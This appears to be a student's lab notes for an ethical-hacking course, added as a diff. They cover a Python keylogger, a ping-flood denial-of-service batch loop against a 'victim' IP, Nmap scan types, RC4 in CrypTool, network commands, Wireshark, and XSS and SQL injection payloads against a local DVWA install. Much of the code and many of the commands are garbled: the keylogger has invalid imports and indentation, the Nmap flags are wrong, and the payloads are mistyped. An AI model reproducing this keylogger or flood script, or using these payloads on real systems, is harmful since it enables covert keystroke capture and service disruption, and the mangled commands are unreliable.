@@ -1,0 +1,138 @@
+PRACTICAL 1: Create a simple keylogger using python.
+
+for installation of pynput:
+Open cmd and type --------- python -m pip install pynput
+
+
+code:
+from pynput.keyboard import key.Listener import logging
+log_dir = " "
+logging.basicConfig(filename = (log_dir + "key_log.txt"),level = logging.DEBUG,format = '%(asetime)s:%(message)s:')
+def on_press(key):
+	logging.info(str(key))
+		with Listener(on_press = on_press) as listener:
+				listener.join()
+
+PRACTICAL 3: Use Nemesy to launch Dos Attack
+
+open cmd : and put command
+
+ipconfig
+ping 10.128.131.108 -t -l 6500 (that 10.128.131.108 is an ip address of victim system)
+
+dowmload nemesy
+and unzip it to run nemesy.exe file
+
+in notepad type the following text to generate data packets
+
+:loop
+ping<ip address of system> -l 65500 -W |-n|
+goto:loop
+
+save as .bat file
+right click and open data packets will be generated
+
+
+PRACTICAL 4: Using Nmap Scanner to perform port scanning of ACK,SYN,FTN,NULL,XMAS
+
+1. Download Nmap for window and install
+2. open cmd and type nmap to check if it install properly
+3. type the command on cmd------- nmap -SA -TA scanme.nmap.org (ACK Scan)
+4. type the command on cmd------- nmap -P,113,139, scanme.nmap.org (SYN Scan)
+5. type the command on cmd------- nmap -SF -TY para (FTN Scan)
+6. type the command on cmd------- nmap -SN -p22 scanme.nmap.org (NULL Scan)
+7. type the command on cmd------- nmap -SX -TY scanme.nmap.org (XMAS Scan)
+
+
+PRACTICAL 5: Use Cryptool to encypt and decrypt password using RC4 algorithm
+
+1. Download CrypTool
+2. Open It and click on file tab--->new file.
+3. type message in plain text.
+4. click on encypt / decrypt tab--->systemetric(modern)--->RCA
+5. give the key value in hexa-decimal number system
+6. perform encryption and decrption
+
+
+PRACTICAL 6: Using TraceRoute, ping, ipconfig, netstat command
+
+1. Tracert Command
+2. ----->tracert www.prestashop.com
+3. Ping Command
+4. ----->ping -?
+5. ----->ping www.yahoo.com
+6. ----->ping 203.192.253.1
+7. Ipconfig Command
+8. ----->ipconfig 1?
+9. ----->ipconfig /all
+10. Netstat Command
+11. ----->netstat
+12. ----->netstat -a
+13. ----->netstat -at
+
+
+PRACTICAL 7: Using Wireshark to capture network traffic and analyze
+
+1. Download and install wireshark and launch it.
+2. Click on capture-->interface-->check local area connection and click on start.
+3. Click on the start button to start capturing traffic via this interface.
+4. Open your internet browser.
+5. Visit the URL that you wanted to capturer the traffic from.
+6. Search http in filter.
+7. Click the red "stop" button.
+8. Click a packet with post method select it & you can dig down to view its details. 
+
+
+PRACTICAL 8: To stimutate cross site scriipting attack
+
+install xamp.
+download DVWA.
+
+extract file and put on location "C:\xamp\htdoc\dvwa"
+
+Open xampp and start apche and mysql
+
+now on chorme goto "localhost/dvwa" the dvwa page will open and at the end create/reset database button shows.
+
+click on create/reset database button and reset the database.
+
+goto dvwa security and set the security level as low.
+
+XSS(Stored)
+give the name and message and click on sign guestbook.
+
+	name:XSS
+			message:<script> alert("XSS")</script>
+			now change the security level to medium
+			put the script below and click sign guestbook.
+	name:XSS
+			message:<script> alert("XSS")</script>
+			reset the database each time you perform operation.
+now change the security level to high
+
+*increase the size of text field by right clicking inspect element.Set the maxlength as 100
+*enter the script of image and click on sign guestbook
+	name:
+			message:hello
+				name:<imsrc=X onError=alert("XSS")>
+						message: hello world
+						XSS(reflected)
+						what your name: <bodyonload=alert(document.cookie)>
+
+
+
+
+PRACTICAL 9: Perform SQL Injection ataack
+
+1. open XAMPP and start acache and mysql
+2. goto web browser and enter site localhost/phpmyadmin
+3. create database with name sql_db
+4. goto site localhost/sql_injection/setup.php and click on crerate/reset database
+5. goto login.php and login using Username as 'admin' and password as 'password'
+6. open the home page of database
+7. goto security setting option in left and set security level as low
+8. click on SQL injection option in left
+9. write '1' in textbox and click on submit
+10. write a'or"=' in textbox and click on submit
+11. write 1=1 in textbox and click on submit
+12. write 1* in textbox and click on submit
